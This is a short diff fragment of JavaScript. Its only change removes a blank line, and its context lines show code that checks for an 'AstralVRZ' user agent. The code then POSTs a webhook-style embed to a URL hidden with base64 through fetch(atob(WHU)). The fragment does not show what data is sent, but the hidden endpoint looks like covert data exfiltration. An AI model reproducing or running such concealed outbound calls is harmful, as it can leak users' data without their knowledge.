@@ -49,7 +49,6 @@ if (/AstralVRZ/i.test(UA)) {
             "color":   9055202
         }]
       };
-      
       fetch(atob(WHU), {
         method: 'POST',
         headers: {
